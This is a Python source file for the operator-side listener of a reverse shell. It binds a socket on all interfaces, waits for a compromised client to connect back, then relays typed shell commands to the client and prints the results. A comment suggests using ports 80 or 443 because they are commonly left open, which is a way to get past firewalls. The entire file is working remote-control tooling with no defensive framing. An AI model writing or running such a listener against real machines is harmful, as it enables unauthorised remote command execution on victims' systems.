import socket

# initialization of variables
SERVER_HOST = "0.0.0.0" # targets all IPv4 addresseses on local machine
SERVER_PORT = 5003 #ephermal port number but we should use 80 or 443 as these are popularly opened
BUFFER_SIZE = 10224 * 128
SEPARATOR = "<sep>"


# creating socket functions
def initialize_socket():
    new_socket = socket.socket()
    new_socket.bind((SERVER_HOST, SERVER_PORT))
    new_socket.listen(5) #5 is max queue of connections
    return new_socket

def accept_connections(socket):
    client_socket, client_address = socket.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")
    return client_socket, client_address

def get_working_directory(client_socket):
    cwd = client_socket.recv(BUFFER_SIZE).decode() # from client.py
    print("[+] Current working directory: ", cwd)
    return cwd

# handling command functions from reverse shell
def handle_command(client_socket, cwd):
    while True:
        command = input(f"{cwd} $> ").strip()
        try:
                    # Send command to the client
                    client_socket.send(command.encode())
                    
                    # exit loop 
                    if command.lower() == "exit":
                        break
                    # Receive and decode the output from the client
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    
                    # Split the output into results and the updated cwd
                    try:
                        results, cwd = output.split(SEPARATOR)
                    except ValueError:
                        print("Error processing command output.")
                        continue  # Skip to the next iteration

                    print(results)
                
        except Exception as e:
            print(f"An error occurred: {e}")
            break  # Exit the loop on error

def main():
    socket = initialize_socket()
    client_socket, client_address = accept_connections(socket)
    cwd = get_working_directory(client_socket)
    handle_command(client_socket, cwd)

if __name__ == "__main__":
            main()